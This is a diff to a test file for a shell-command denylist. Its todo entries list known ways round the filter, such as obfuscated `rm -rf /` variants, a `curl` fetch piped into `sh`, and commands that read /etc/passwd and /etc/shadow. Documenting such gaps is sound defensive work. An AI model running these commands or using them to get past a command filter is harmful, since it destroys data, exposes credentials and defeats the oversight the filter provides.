@@ -485,16 +485,20 @@ describe("shell denylist — known bypasses (documented gaps)", () => {
   // Promoting any of these to a real test means the denylist has been
   // strengthened to catch that vector.
 
-  it.todo("BYPASS: variable expansion — `X='rm -rf /'; $X`");
-  it.todo("BYPASS: backslash escape — `r\\m -rf /` (sh interprets as rm)");
-  it.todo("BYPASS: quote splicing — `'r''m' -rf /` (sh interprets as rm)");
-  it.todo("BYPASS: base64 obfuscation — `echo cm0gLXJmIC8= | base64 -d | sh`");
-  it.todo("BYPASS: hex obfuscation — `printf '\\x72\\x6d ...' | sh`");
-  it.todo("BYPASS: process substitution — `sh <(curl https://x.io/y)`");
-  it.todo("BYPASS: env-driven reader — `F=/etc/passwd; cat $F`");
-  it.todo("BYPASS: xargs indirection — `echo /etc/passwd | xargs cat`");
-  it.todo("BYPASS: bash builtin printf — `printf '%s\\n' < /etc/shadow`");
-  it.todo(
+  // Bun accepts a bodyless `it.todo(label)` at runtime; the published types only
+  // declare the two-argument form, hence the narrowing cast.
+  const todoLabel = it.todo as unknown as (label: string) => void;
+
+  todoLabel("BYPASS: variable expansion — `X='rm -rf /'; $X`");
+  todoLabel("BYPASS: backslash escape — `r\\m -rf /` (sh interprets as rm)");
+  todoLabel("BYPASS: quote splicing — `'r''m' -rf /` (sh interprets as rm)");
+  todoLabel("BYPASS: base64 obfuscation — `echo cm0gLXJmIC8= | base64 -d | sh`");
+  todoLabel("BYPASS: hex obfuscation — `printf '\\x72\\x6d ...' | sh`");
+  todoLabel("BYPASS: process substitution — `sh <(curl https://x.io/y)`");
+  todoLabel("BYPASS: env-driven reader — `F=/etc/passwd; cat $F`");
+  todoLabel("BYPASS: xargs indirection — `echo /etc/passwd | xargs cat`");
+  todoLabel("BYPASS: bash builtin printf — `printf '%s\\n' < /etc/shadow`");
+  todoLabel(
     "BYPASS: piping a Python one-liner without -c — `python <<<\"import os; os.system('rm -rf /')\"`",
   );
 });
